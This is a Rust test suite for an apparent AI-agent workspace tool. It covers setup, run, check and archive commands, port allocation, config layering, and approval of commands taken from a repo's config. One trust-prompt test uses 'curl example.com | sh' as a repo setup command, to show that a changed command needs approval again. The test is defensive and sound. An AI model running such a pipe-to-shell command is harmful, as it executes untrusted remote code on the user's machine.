//! Space commands and project config (docs/config.md) against `Core` +
//! testkit fakes: setup before the first turn (ok / fail / skip), the
//! trust prompt for repo commands, Run/Stop, check after a turn, archive
//! order, ports, copy and the config views.

use std::path::Path;
use std::time::Duration;

use serde_json::json;
use theodore_contract::{
    AddProjectRequest, ConfigLayer, CreateSpaceRequest, ProcessStatus, Project, SetupAction,
    SetupStatus, Space, SpaceCheckStatus, SpaceRunRequest, SpaceSendRequest, SpaceSetupRequest,
    SpaceStatus, SpaceTrustRequest, models,
};
use theodore_domain::{AgentId, Sha, Usage};
use theodore_ports::{AgentEvent, AgentMode, Store};

use crate::testkit::{FakeScript, Fixtures, fixtures};
use crate::{Core, Receivers};

pub(crate) async fn wait_until(mut cond: impl FnMut() -> bool) {
    for _ in 0..2000 {
        if cond() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(5)).await;
    }
    panic!("condition not met in time");
}

pub(crate) struct Env {
    pub f: Fixtures,
    pub core: Core,
    pub recv: Receivers,
    pub project: Project,
    folder: tempfile::TempDir,
    _spaces: tempfile::TempDir,
}

/// A local-folder project in a real temp dir, with space worktrees as real
/// directories.
async fn started() -> Env {
    start_env(false).await
}

/// `started`, with `tools`: the fake MCP registry wired in.
pub(crate) async fn start_env(tools: bool) -> Env {
    start_env_with(|f| if tools { f.deps_with_tools() } else { f.deps() }).await
}

/// `started` with the deps `deps` picks from the fixtures.
pub(crate) async fn start_env_with(deps: impl FnOnce(&Fixtures) -> crate::Deps) -> Env {
    let f = fixtures();
    let folder = tempfile::tempdir().unwrap();
    let spaces = tempfile::tempdir().unwrap();
    f.git.set_space_root(spaces.path());
    let (core, recv) = Core::start(deps(&f));
    tokio::time::sleep(Duration::from_millis(30)).await;
    let project = core
        .add_project(AddProjectRequest {
            repo: None,
            path: Some(folder.path().display().to_string()),
        })
        .await
        .expect("add_project");
    wait_until(|| {
        f.store
            .get(models::PROJECT, &project.id)
            .unwrap()
            .is_some_and(|r| r.data["status"] == json!("ready"))
    })
    .await;
    let project: Project = serde_json::from_value(
        f.store
            .get(models::PROJECT, &project.id)
            .unwrap()
            .unwrap()
            .data,
    )
    .unwrap();
    f.git.set_resolve("main", Sha::new("base000"));
    Env {
        f,
        core,
        recv,
        project,
        folder,
        _spaces: spaces,
    }
}

impl Env {
    pub fn global(&self, yaml: &str) {
        std::fs::write(self.f.data_dir.path().join("config.yaml"), yaml).unwrap();
    }

    pub fn repo_file(&self, rel: &str, yaml: &str) {
        let path = self.folder.path().join(rel);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, yaml).unwrap();
    }

    pub fn space(&self, id: &str) -> Space {
        serde_json::from_value(self.f.store.get(models::SPACE, id).unwrap().unwrap().data).unwrap()
    }

    pub async fn create(&self, goal: &str) -> Space {
        self.core
            .create_space(CreateSpaceRequest {
                project: self.project.id.clone(),
                goal: goal.into(),
                name: None,
                branch: None,
                base: None,
                agent: None,
                model: None,
            })
            .await
            .expect("create_space")
    }

    pub async fn until(&self, id: &str, cond: impl Fn(&Space) -> bool) -> Space {
        wait_until(|| cond(&self.space(id))).await;
        self.space(id)
    }

    fn agent_runs(&self) -> usize {
        self.f.agents.requests().len()
    }
}

pub(crate) fn done(text: &str) -> Vec<AgentEvent> {
    vec![AgentEvent::Done {
        final_text: text.into(),
        usage: Usage::default(),
    }]
}

fn setup_status(s: &Space) -> Option<SetupStatus> {
    s.setup.as_ref().map(|x| x.status)
}

fn env_of(env: &[(String, String)], key: &str) -> Option<String> {
    env.iter().find(|(k, _)| k == key).map(|(_, v)| v.clone())
}

#[tokio::test]
async fn setup_runs_before_the_first_turn_with_the_variables() {
    let e = started().await;
    e.global(
        "spaces:\n  setup: make setup\n  ports: 2\n  env: {APP_URL: \"http://localhost:$THEODORE_PORT_1\"}\n",
    );
    e.f.agents.push_script(done("ok"));
    let s = e.create("Fix the login").await;
    assert_eq!(s.ports.len(), 2);
    let s = e
        .until(&s.id, |s| {
            setup_status(s) == Some(SetupStatus::Done) && s.turns == 1
        })
        .await;
    assert!(!s.setup.as_ref().unwrap().goal_pending);

    let specs = e.f.commands.specs();
    assert_eq!(specs.len(), 1);
    let spec = &specs[0];
    assert_eq!(spec.script, "make setup");
    assert_eq!(spec.cwd, Path::new(&s.worktree));
    assert_eq!(spec.timeout, Some(Duration::from_secs(600)));
    assert_eq!(
        env_of(&spec.env, "THEODORE_SPACE").as_deref(),
        Some("fix-the-login")
    );
    assert_eq!(
        env_of(&spec.env, "THEODORE_PORT"),
        Some(s.ports[0].to_string())
    );
    assert_eq!(
        env_of(&spec.env, "THEODORE_PORT_1"),
        Some(s.ports[1].to_string())
    );
    assert_eq!(
        env_of(&spec.env, "THEODORE_WORKTREE").as_deref(),
        Some(s.worktree.as_str())
    );
    assert_eq!(
        env_of(&spec.env, "THEODORE_BRANCH").as_deref(),
        Some(s.branch.as_str())
    );
    assert_eq!(
        env_of(&spec.env, "THEODORE_ROOT"),
        e.project.path.clone(),
        "a local folder is the root"
    );
    assert_eq!(
        env_of(&spec.env, "APP_URL"),
        Some(format!("http://localhost:{}", s.ports[1]))
    );

    // The agent turn gets the same variables.
    let req = e.f.agents.last_request().expect("the goal ran");
    assert_eq!(
        env_of(&req.env, "THEODORE_SPACE").as_deref(),
        Some("fix-the-login")
    );
    let logs = e.core.space_logs(&s.id).await.unwrap();
    assert_eq!(logs[0].line, "$ make setup");
}

#[tokio::test]
async fn a_failed_setup_holds_the_goal_until_retry() {
    let e = started().await;
    e.global("spaces: {setup: make setup}");
    e.f.commands.on(
        "make setup",
        FakeScript::Exit {
            lines: vec!["no make".into()],
            code: 3,
        },
    );
    let s = e.create("Fix it").await;
    let s = e
        .until(&s.id, |s| setup_status(s) == Some(SetupStatus::Failed))
        .await;
    let setup = s.setup.unwrap();
    assert_eq!(setup.error.as_deref(), Some("setup exited with 3"));
    assert!(setup.goal_pending);
    tokio::time::sleep(Duration::from_millis(50)).await;
    assert_eq!(e.agent_runs(), 0, "the goal waits");

    e.f.commands.on(
        "make setup",
        FakeScript::Exit {
            lines: vec![],
            code: 0,
        },
    );
    e.f.agents.push_script(done("ok"));
    e.core
        .space_setup(SpaceSetupRequest {
            space: s.id.clone(),
            action: SetupAction::Retry,
        })
        .await
        .unwrap();
    e.until(&s.id, |s| {
        setup_status(s) == Some(SetupStatus::Done) && s.turns == 1
    })
    .await;
    assert_eq!(e.f.commands.specs().len(), 2);
}

#[tokio::test]
async fn continue_without_setup_starts_the_goal() {
    let e = started().await;
    e.global("spaces: {setup: make setup, timeout_s: {setup: 1}}");
    e.f.commands.on("make setup", FakeScript::Timeout);
    let s = e.create("Fix it").await;
    let s = e
        .until(&s.id, |s| setup_status(s) == Some(SetupStatus::Failed))
        .await;
    assert_eq!(
        s.setup.as_ref().unwrap().error.as_deref(),
        Some("setup timed out after 1 s")
    );
    e.f.agents.push_script(done("ok"));
    let s = e
        .core
        .space_setup(SpaceSetupRequest {
            space: s.id.clone(),
            action: SetupAction::Skip,
        })
        .await
        .unwrap();
    assert_eq!(setup_status(&s), Some(SetupStatus::Skipped));
    e.until(&s.id, |s| s.turns == 1).await;
}

#[tokio::test]
async fn no_setup_means_the_goal_runs_at_once() {
    let e = started().await;
    e.f.agents.push_script(done("ok"));
    let s = e.create("Fix it").await;
    // Zero config still gets the defaults: 2 ports, and a note that this
    // empty fixture folder has no `.env*` to copy — but no command to
    // wait on, so the goal still runs at once.
    let setup = s.setup.clone().expect("a copy note");
    assert_eq!(setup.status, SetupStatus::Done);
    assert!(!setup.goal_pending);
    assert!(setup.notes.iter().any(|n| n.contains(".env*")), "{setup:?}");
    assert_eq!(s.ports.len(), 2);
    e.until(&s.id, |s| s.turns == 1).await;
    assert!(e.f.commands.specs().is_empty());
}

#[tokio::test]
async fn explicit_copy_and_ports_turn_the_defaults_off() {
    let e = started().await;
    e.global("spaces: {copy: [], ports: 0}");
    e.f.agents.push_script(done("ok"));
    let s = e.create("Fix it").await;
    assert_eq!(s.setup, None, "no note: copy is off, not just unmatched");
    assert!(s.ports.is_empty());
    e.until(&s.id, |s| s.turns == 1).await;
}

#[tokio::test]
async fn sending_is_refused_while_setting_up() {
    let e = started().await;
    e.global("spaces: {setup: make setup}");
    e.f.commands
        .on("make setup", FakeScript::Hang { lines: vec![] });
    let s = e.create("").await;
    let s = e
        .until(&s.id, |s| setup_status(s) == Some(SetupStatus::Running))
        .await;
    let err = e
        .core
        .space_send(SpaceSendRequest {
            space: s.id.clone(),
            text: "hi".into(),
            agent: None,
            model: None,
            mode: None,
            attachments: None,
        })
        .await
        .unwrap_err();
    assert!(err.to_string().contains("setting up"), "{err}");
    e.core
        .space_setup(SpaceSetupRequest {
            space: s.id.clone(),
            action: SetupAction::Skip,
        })
        .await
        .unwrap();
}

#[tokio::test]
async fn repo_commands_wait_for_approval_and_a_change_asks_again() {
    let e = started().await;
    e.repo_file(
        ".theodore/config.yaml",
        "spaces:\n  setup: pnpm install\n  run: pnpm dev\n",
    );
    let s = e.create("Fix it").await;
    assert_eq!(setup_status(&s), Some(SetupStatus::Waiting));
    tokio::time::sleep(Duration::from_millis(50)).await;
    assert!(e.f.commands.specs().is_empty(), "nothing runs unapproved");
    assert_eq!(e.agent_runs(), 0);

    let view = e.core.space_config(&s.id).await.unwrap();
    let repo = view.repo_commands.clone().expect("repo commands");
    assert!(!repo.trusted);
    let keys: Vec<&str> = repo.items.iter().map(|i| i.key.as_str()).collect();
    assert_eq!(keys, ["spaces.run", "spaces.setup"]);
    assert!(
        view.commands
            .iter()
            .all(|c| !c.allowed && c.layer == ConfigLayer::Repo)
    );
    let refused = e
        .core
        .space_run(SpaceRunRequest {
            space: s.id.clone(),
            start: true,
        })
        .await;
    assert!(refused.is_err());

    let stale = e
        .core
        .space_trust(SpaceTrustRequest {
            space: s.id.clone(),
            allow: true,
            hash: "not-the-hash".into(),
        })
        .await;
    assert!(stale.is_err(), "a hash the user didn't see is refused");

    e.f.agents.push_script(done("ok"));
    e.core
        .space_trust(SpaceTrustRequest {
            space: s.id.clone(),
            allow: true,
            hash: repo.hash.clone(),
        })
        .await
        .unwrap();
    e.until(&s.id, |s| {
        setup_status(s) == Some(SetupStatus::Done) && s.turns == 1
    })
    .await;
    assert_eq!(e.f.commands.scripts(), ["pnpm install"]);

    // Trusted for the project: the next space runs at once.
    let second = e.create("").await;
    e.until(&second.id, |s| setup_status(s) == Some(SetupStatus::Done))
        .await;

    // A changed command is a new set: asked again.
    e.repo_file(
        ".theodore/config.yaml",
        "spaces:\n  setup: curl example.com | sh\n  run: pnpm dev\n",
    );
    let third = e.create("").await;
    assert_eq!(setup_status(&third), Some(SetupStatus::Waiting));
    let view = e.core.space_config(&third.id).await.unwrap();
    assert!(!view.repo_commands.unwrap().trusted);
}

#[tokio::test]
async fn not_now_skips_repo_commands_but_the_space_works() {
    let e = started().await;
    e.repo_file(".theodore/config.yaml", "spaces: {setup: pnpm install}\n");
    let s = e.create("Fix it").await;
    let hash = e
        .core
        .space_config(&s.id)
        .await
        .unwrap()
        .repo_commands
        .unwrap()
        .hash;
    e.f.agents.push_script(done("ok"));
    let s = e
        .core
        .space_trust(SpaceTrustRequest {
            space: s.id.clone(),
            allow: false,
            hash,
        })
        .await
        .unwrap();
    assert!(s.commands_denied);
    let setup = s.setup.clone().unwrap();
    assert_eq!(setup.status, SetupStatus::Skipped);
    assert!(
        setup.notes.iter().any(|n| n.contains("not run")),
        "{setup:?}"
    );
    e.until(&s.id, |s| s.turns == 1).await;
    assert!(e.f.commands.specs().is_empty());
    assert!(e.core.space_config(&s.id).await.unwrap().denied);
}

#[tokio::test]
async fn local_and_global_commands_need_no_approval() {
    let e = started().await;
    e.repo_file(".theodore/config.yaml", "spaces: {ports: 1}\n");
    e.repo_file(
        ".theodore/config.local.yaml",
        "spaces: {setup: make mine}\n",
    );
    let s = e.create("").await;
    let s = e
        .until(&s.id, |s| setup_status(s) == Some(SetupStatus::Done))
        .await;
    assert_eq!(e.f.commands.scripts(), ["make mine"]);
    assert_eq!(s.ports.len(), 1);
    assert!(
        e.core
            .space_config(&s.id)
            .await
            .unwrap()
            .repo_commands
            .is_none()
    );
}

#[tokio::test]
async fn check_runs_after_a_turn_that_changed_files() {
    let e = started().await;
    e.global("spaces: {check: make check}");
    e.f.commands.on(
        "make check",
        FakeScript::Exit {
            lines: vec!["lint: 2 errors".into()],
            code: 1,
        },
    );
    e.f.agents.push_script(done("edited"));
    e.f.git.push_checkpoint(Sha::new("turn111"));
    let s = e.create("Fix it").await;
    let s = e
        .until(&s.id, |s| {
            s.status == SpaceStatus::Idle
                && s.turn_log
                    .first()
                    .and_then(|t| t.check.as_ref())
                    .is_some_and(|c| c.status != SpaceCheckStatus::Running)
        })
        .await;
    let check = s.turn_log[0].check.clone().unwrap();
    assert_eq!(check.status, SpaceCheckStatus::Failed);
    assert_eq!(check.exit_code, Some(1));
    assert_eq!(check.output, ["lint: 2 errors", "check exited with 1"]);
    assert_eq!(s.run, None);

    // The failure goes into the next prompt; a turn without changes runs
    // no check.
    e.f.agents.push_script(done("nothing to do"));
    e.core
        .space_send(SpaceSendRequest {
            space: s.id.clone(),
            text: "fix the lint".into(),
            agent: None,
            model: None,
            mode: None,
            attachments: None,
        })
        .await
        .unwrap();
    let s = e
        .until(&s.id, |s| s.turns == 2 && s.status == SpaceStatus::Idle)
        .await;
    let prompt = e.f.agents.last_request().unwrap().prompt;
    assert!(prompt.contains("check failed"), "{prompt}");
    assert!(prompt.contains("lint: 2 errors"));
    assert_eq!(s.turn_log[1].check, None);
    assert_eq!(e.f.commands.scripts(), ["make check"]);
}

#[tokio::test]
async fn run_and_stop_and_archive_in_order() {
    let e = started().await;
    e.global(
        "spaces:\n  ports: 2\n  run: pnpm dev --port $THEODORE_PORT\n  archive: docker compose down\n",
    );
    let s = e.create("").await;
    assert_eq!(s.ports.len(), 2);
    let ports = s.ports.clone();
    e.f.commands.on(
        "pnpm dev",
        FakeScript::Hang {
            lines: vec!["ready".into()],
        },
    );
    e.core
        .space_run(SpaceRunRequest {
            space: s.id.clone(),
            start: true,
        })
        .await
        .unwrap();
    e.until(&s.id, |s| {
        s.process
            .as_ref()
            .is_some_and(|p| p.status == ProcessStatus::Running)
    })
    .await;
    wait_until(|| {
        e.core
            .with_runtime(&s.id, |rt| rt.logs.iter().any(|l| l.line == "ready"))
    })
    .await;

    // Archive: run stops, then `archive` runs while the worktree is still
    // there, then the worktree goes and the ports are released.
    let git = e.f.git.clone();
    let removed_at_archive = std::sync::Arc::new(std::sync::Mutex::new(None));
    let seen = removed_at_archive.clone();
    e.f.commands.on_spawn(move |spec| {
        if spec.script.contains("docker") {
            *seen.lock().unwrap() = Some(git.removed_spaces().len());
        }
    });
    e.core.archive_space(&s.id).await.unwrap();
    let s = e.space(&s.id);
    assert_eq!(s.status, SpaceStatus::Archived);
    assert_eq!(
        s.process.as_ref().map(|p| p.status),
        Some(ProcessStatus::Stopped)
    );
    assert_eq!(*removed_at_archive.lock().unwrap(), Some(0));
    assert_eq!(e.f.git.removed_spaces(), std::slice::from_ref(&s.id));
    assert!(s.ports.is_empty(), "released");
    assert_eq!(
        e.f.commands.scripts(),
        ["pnpm dev --port $THEODORE_PORT", "docker compose down"]
    );
    let _ = ports;
}

#[tokio::test]
async fn ports_are_unique_across_live_spaces() {
    let e = started().await;
    e.global("spaces: {ports: 3}");
    let a = e.create("").await;
    let b = e.create("").await;
    assert_eq!(a.ports.len(), 3);
    assert_eq!(b.ports.len(), 3);
    assert!(a.ports.iter().all(|p| !b.ports.contains(p)), "{a:?} {b:?}");
    e.core.archive_space(&a.id).await.unwrap();
    assert!(e.space(&a.id).ports.is_empty());
    let back = e.core.unarchive_space(&a.id).await.unwrap();
    assert_eq!(back.ports.len(), 3, "fresh ports after unarchive");
    assert!(back.ports.iter().all(|p| !b.ports.contains(p)));
}

#[tokio::test]
async fn copy_brings_files_from_the_checkout() {
    let e = started().await;
    std::fs::write(e.folder.path().join(".env"), "SECRET=1").unwrap();
    e.global("spaces: {copy: [.env, .env.missing]}");
    let s = e.create("").await;
    assert_eq!(
        std::fs::read_to_string(Path::new(&s.worktree).join(".env")).unwrap(),
        "SECRET=1"
    );
    let setup = s.setup.expect("notes");
    assert_eq!(setup.status, SetupStatus::Done);
    assert!(
        setup.notes.iter().any(|n| n.contains(".env.missing")),
        "{setup:?}"
    );
}

#[tokio::test]
async fn the_repo_file_sets_the_spaces_agent_legacy_path_too() {
    let e = started().await;
    e.repo_file(".review/config.yaml", "agents:\n  chat: codex\n");
    let s = e.create("").await;
    assert_eq!(s.agent, AgentId::Codex, "legacy .review/config.yaml");
    e.repo_file(
        ".theodore/config.yaml",
        "review: {agents: {chat: gemini}}\n",
    );
    let s = e.create("").await;
    assert_eq!(s.agent, AgentId::Gemini, "the new file wins");
    // The legacy file was replaced: its keys don't linger.
    let rows =
        e.f.store
            .query(
                models::SETTING,
                "scope",
                &format!("repo:{}", e.project.repo.slug()),
            )
            .unwrap();
    let keys: Vec<String> = rows
        .iter()
        .map(|r| r.data["key"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(keys, ["agents.chat"]);
}

#[tokio::test]
async fn project_config_shows_values_and_their_files() {
    let e = started().await;
    e.global("spaces: {ports: 1, check: make check}\nbogus: 1\n");
    e.repo_file(".theodore/config.yaml", "spaces: {run: pnpm dev}\n");
    e.repo_file(".theodore/config.local.yaml", "spaces: {ports: 2}\n");
    let cfg = e.core.project_config(&e.project.id).await.unwrap();
    let layers: Vec<ConfigLayer> = cfg.files.iter().map(|f| f.layer).collect();
    assert_eq!(
        layers,
        [ConfigLayer::Global, ConfigLayer::Repo, ConfigLayer::Local]
    );
    assert!(cfg.files.iter().all(|f| f.exists));
    let find = |k: &str| cfg.entries.iter().find(|x| x.key == k).cloned().unwrap();
    assert_eq!(find("spaces.ports").value, "2");
    assert_eq!(find("spaces.ports").layer, ConfigLayer::Local);
    assert_eq!(find("spaces.check").layer, ConfigLayer::Global);
    assert_eq!(find("spaces.run").layer, ConfigLayer::Repo);
    assert_eq!(cfg.unknown, ["bogus"]);
    assert!(!cfg.repo_commands.unwrap().trusted);
}

#[tokio::test]
async fn the_global_file_is_created_from_the_template_once() {
    let e = started().await;
    let info = e.core.global_config().await.unwrap();
    assert!(!info.exists);
    assert_eq!(
        Path::new(&info.path),
        e.f.data_dir.path().join("config.yaml")
    );
    let info = e.core.ensure_global_config().await.unwrap();
    assert!(info.exists);
    let text = std::fs::read_to_string(&info.path).unwrap();
    assert!(text.starts_with("# Theodore global config"));
    std::fs::write(&info.path, "spaces: {ports: 1}\n").unwrap();
    e.core.ensure_global_config().await.unwrap();
    assert_eq!(
        std::fs::read_to_string(&info.path).unwrap(),
        "spaces: {ports: 1}\n",
        "never overwritten"
    );
}

#[tokio::test]
async fn a_restart_settles_what_was_left_running() {
    let e = started().await;
    e.global("spaces: {run: pnpm dev}");
    let s = e.create("").await;
    e.f.commands
        .on("pnpm dev", FakeScript::Hang { lines: vec![] });
    e.core
        .space_run(SpaceRunRequest {
            space: s.id.clone(),
            start: true,
        })
        .await
        .unwrap();
    e.until(&s.id, |s| s.process.is_some()).await;
    // A second core over the same store, as after a crash.
    let (core2, _recv2) = Core::start(e.f.deps());
    let s = e
        .until(&s.id, |s| {
            s.process
                .as_ref()
                .is_some_and(|p| p.status == ProcessStatus::Stopped)
        })
        .await;
    assert!(s.process.unwrap().error.unwrap().contains("interrupted"));
    drop(core2);
}

#[tokio::test]
async fn a_clean_exit_stops_every_running_space_command() {
    let e = started().await;
    e.global("spaces: {run: pnpm dev}");
    let s = e.create("").await;
    e.f.commands
        .on("pnpm dev", FakeScript::Hang { lines: vec![] });
    e.core
        .space_run(SpaceRunRequest {
            space: s.id.clone(),
            start: true,
        })
        .await
        .unwrap();
    e.until(&s.id, |s| s.process.is_some()).await;

    e.core.stop_all_running_spaces().await;

    let s = e
        .until(&s.id, |s| {
            s.process
                .as_ref()
                .is_some_and(|p| p.status == ProcessStatus::Stopped)
        })
        .await;
    assert_eq!(s.process.unwrap().pgid, None);
}

#[tokio::test]
async fn a_restart_reaps_a_group_still_alive_and_matching() {
    let e = started().await;
    e.global("spaces: {run: pnpm dev}");
    let s = e.create("").await;
    e.f.commands
        .on("pnpm dev", FakeScript::Hang { lines: vec![] });
    e.f.commands.set_next_pid(4242);
    e.core
        .space_run(SpaceRunRequest {
            space: s.id.clone(),
            start: true,
        })
        .await
        .unwrap();
    let s = e.until(&s.id, |s| s.process.is_some()).await;
    assert_eq!(s.process.as_ref().unwrap().pgid, Some(4242));

    // The next Theodore process finds the group still alive, running the
    // same script it started: reap it, then settle the row.
    e.f.commands.set_group_matches(true);
    let (core2, _recv2) = Core::start(e.f.deps());
    let s = e
        .until(&s.id, |s| {
            s.process
                .as_ref()
                .is_some_and(|p| p.status == ProcessStatus::Stopped)
        })
        .await;
    let process = s.process.unwrap();
    assert!(
        process.error.as_deref().unwrap().contains("restarted"),
        "{process:?}"
    );
    assert_eq!(process.pgid, None, "cleared once settled");
    assert_eq!(e.f.commands.reaped().len(), 1);
    assert_eq!(e.f.commands.reaped()[0].0, 4242);
    drop(core2);
}

#[tokio::test]
async fn a_restart_never_kills_a_pid_that_no_longer_matches() {
    let e = started().await;
    e.global("spaces: {run: pnpm dev}");
    let s = e.create("").await;
    e.f.commands
        .on("pnpm dev", FakeScript::Hang { lines: vec![] });
    e.f.commands.set_next_pid(4343);
    e.core
        .space_run(SpaceRunRequest {
            space: s.id.clone(),
            start: true,
        })
        .await
        .unwrap();
    e.until(&s.id, |s| s.process.is_some()).await;

    // `group_matches` defaults to false: a pid since reused, or the group
    // already gone — never a confident match, so never killed.
    let (core2, _recv2) = Core::start(e.f.deps());
    let s = e
        .until(&s.id, |s| {
            s.process
                .as_ref()
                .is_some_and(|p| p.status == ProcessStatus::Stopped)
        })
        .await;
    let process = s.process.unwrap();
    assert!(process.error.unwrap().contains("interrupted"));
    assert_eq!(process.pgid, None, "cleared even though nothing was killed");
    assert!(e.f.commands.reaped().is_empty(), "never touched");
    drop(core2);
}

#[tokio::test]
async fn run_reports_a_port_already_held_instead_of_crashing() {
    let e = started().await;
    e.global("spaces: {ports: 1, run: pnpm dev}");
    let s = e.create("").await;
    let port = s.ports[0];
    let _listener = std::net::TcpListener::bind(("127.0.0.1", port)).expect("bind the port");

    e.core
        .space_run(SpaceRunRequest {
            space: s.id.clone(),
            start: true,
        })
        .await
        .unwrap();
    let s = e
        .until(&s.id, |s| {
            s.process
                .as_ref()
                .is_some_and(|p| p.status == ProcessStatus::Failed)
        })
        .await;
    let process = s.process.unwrap();
    let message = format!("port {port} is already in use by another process");
    assert_eq!(process.error.as_deref(), Some(message.as_str()));
    assert!(
        e.f.commands.scripts().is_empty(),
        "the command was never spawned"
    );
    assert!(
        e.core
            .with_runtime(&s.id, |rt| rt.logs.iter().any(|l| l.line == message)),
        "the run log explains it"
    );
}

#[tokio::test]
async fn set_up_with_agent_sends_a_turn_to_write_the_spaces_section() {
    let e = started().await;
    e.global("spaces: {copy: [], ports: 0}");
    let s = e.create("").await;
    assert_eq!(s.setup, None, "nothing configured, nothing to wait on");

    e.f.agents
        .push_script(done("added spaces: setup, run, check"));
    e.core.space_setup_assist(&s.id).await.unwrap();
    e.until(&s.id, |s| s.turns == 1).await;

    let req = e.f.agents.last_request().expect("the turn ran");
    assert_eq!(req.mode, AgentMode::Edit, "it must be able to write files");
    assert!(
        req.prompt.contains(".theodore/config.yaml"),
        "{}",
        req.prompt
    );
    assert!(req.prompt.contains("spaces:"), "{}", req.prompt);
    assert!(req.prompt.contains("$THEODORE_PORT"), "{}", req.prompt);
    for word in ["setup", "run", "check", "archive", "copy", "ports"] {
        assert!(
            req.prompt.contains(word),
            "{word:?} missing: {}",
            req.prompt
        );
    }
}

#[tokio::test]
async fn fix_with_agent_quotes_the_failure_and_leaves_setup_retryable() {
    let e = started().await;
    e.global("spaces: {setup: make setup}");
    e.f.commands.on(
        "make setup",
        FakeScript::Exit {
            lines: vec!["no make".into()],
            code: 3,
        },
    );
    let s = e.create("Fix it").await;
    let s = e
        .until(&s.id, |s| setup_status(s) == Some(SetupStatus::Failed))
        .await;
    assert!(
        s.setup.as_ref().unwrap().goal_pending,
        "the goal still waits"
    );

    e.f.agents.push_script(done("fixed the Makefile"));
    let s = e.core.space_fix_setup(&s.id).await.unwrap();
    assert_eq!(
        setup_status(&s),
        Some(SetupStatus::Failed),
        "setup itself is untouched: Retry / Continue without setup stay put"
    );
    e.until(&s.id, |s| s.turns == 1).await;

    let req = e.f.agents.last_request().expect("the fix turn ran");
    assert_eq!(req.mode, AgentMode::Edit);
    assert!(req.prompt.contains("make setup"), "{}", req.prompt);
    assert!(req.prompt.contains("setup exited with 3"), "{}", req.prompt);
    assert!(req.prompt.contains("no make"), "{}", req.prompt);

    // Retry still works, and the goal it was waiting on finally runs.
    e.f.commands.on(
        "make setup",
        FakeScript::Exit {
            lines: vec![],
            code: 0,
        },
    );
    e.f.agents.push_script(done("ok"));
    e.core
        .space_setup(SpaceSetupRequest {
            space: s.id.clone(),
            action: SetupAction::Retry,
        })
        .await
        .unwrap();
    e.until(&s.id, |s| {
        setup_status(s) == Some(SetupStatus::Done) && s.turns == 2
    })
    .await;
}

#[tokio::test]
async fn fix_with_agent_refuses_when_setup_has_not_failed() {
    let e = started().await;
    let s = e.create("").await;
    let err = e.core.space_fix_setup(&s.id).await.unwrap_err();
    assert!(err.to_string().contains("hasn't failed"), "{err}");
}
